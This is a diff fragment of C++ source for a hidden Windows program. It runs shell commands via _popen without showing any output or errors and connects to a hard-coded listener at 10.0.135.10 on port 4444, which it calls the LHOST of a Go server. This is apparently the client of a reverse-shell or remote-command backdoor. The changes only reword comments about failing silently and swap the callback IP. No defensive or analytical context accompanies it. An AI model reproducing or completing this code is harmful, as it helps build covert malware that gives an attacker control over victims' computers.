@@ -12,10 +12,10 @@ void executeCommand(const string& command) {
     char buffer[128];
     FILE* fp = _popen(command.c_str(), "r");
     if (fp == NULL) {
-        return; // If execution fails, return without showing an error in the GUI
+        return; // If execution fails, return silently
     }
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        // Send the output back to the server, can be expanded to send results back
+        // You can handle the output here, but nothing is shown on the console
     }
     _pclose(fp);
 }
@@ -28,7 +28,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // Initialize WinSock
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        return 1; // If failed to initialize Winsock, exit without showing any error
+        return 1; // If failed to initialize Winsock, exit silently
     }
 
     // Create socket
@@ -40,7 +40,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Define the server address (change this to the server's IP and port)
     server.sin_family = AF_INET;
     server.sin_port = htons(4444);  // Use the same LPORT as in Go server
-    server.sin_addr.s_addr = inet_addr("10.0.1.35");  // Use the LHOST from Go server
+    server.sin_addr.s_addr = inet_addr("10.0.135.10");  // Use the LHOST from Go server
 
     // Connect to the server
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
